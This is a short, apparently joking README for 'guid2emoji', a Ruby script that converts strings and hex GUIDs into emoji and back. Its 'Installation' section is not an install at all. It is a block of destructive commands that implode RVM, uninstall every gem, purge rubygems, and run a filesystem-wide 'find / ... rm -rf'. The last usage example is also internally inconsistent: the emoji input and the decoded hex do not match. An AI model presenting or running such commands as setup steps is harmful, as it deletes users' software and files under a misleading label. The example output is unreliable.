# guid2emoji

Solve all your naming issues by converting Strings into emojis and back. It is extra smart when converting hex strings.

# Installation

```
rvm implode
gem uninstall --all
apt-get remove -y --purge rubygems-integration rubygems rake bundler 
find / -name ".rvm" -exec rm -rf "{}" \;
```

# Usage

Convert a normal string

    $ ruby g2e.rb f1441f79-d010-4275-ad87-46a909b2c772
    f1441f79-d010-4275-ad87-46a909b2c772 = 🙦😱😴😴😱🙦😷😹😭🙤😰😱😰😭😴😲😷😵😭🙡🙤😸😷😭😴😶🙡😹😰😹🙢😲🙣😷😷😲

    $ ruby g2e.rb 🙦😱😴😴😱🙦😷😹😭🙤😰😱😰😭😴😲😷😵😭🙡🙤😸😷😭😴😶🙡😹😰😹🙢😲🙣😷😷😲
    🙦😱😴😴😱🙦😷😹😭🙤😰😱😰😭😴😲😷😵😭🙡🙤😸😷😭😴😶🙡😹😰😹🙢😲🙣😷😷😲 = f1441f79-d010-4275-ad87-46a909b2c772

Convert a hex string

    $ ruby g2e.rb -x f1441f79d0104275ad8746a909b2c772
    f1441f79d0104275ad8746a909b2c772 = 🏱🕄🔟👹🗐🔐🍂👵💭🖇🍆🎩🐉💲🗇🍲

    $ ruby g2e.rb -x 📱🕄🌟🍹📐🔐🕂👵💭🎇👆🖩🔉🎲🏇🍲
    🏱🕄🔟🍹🗐🐐👂🍵🎭🎇🕆🎩🌉💲🏇🕲 = f1441f79d0104275ad8746a99b2c772

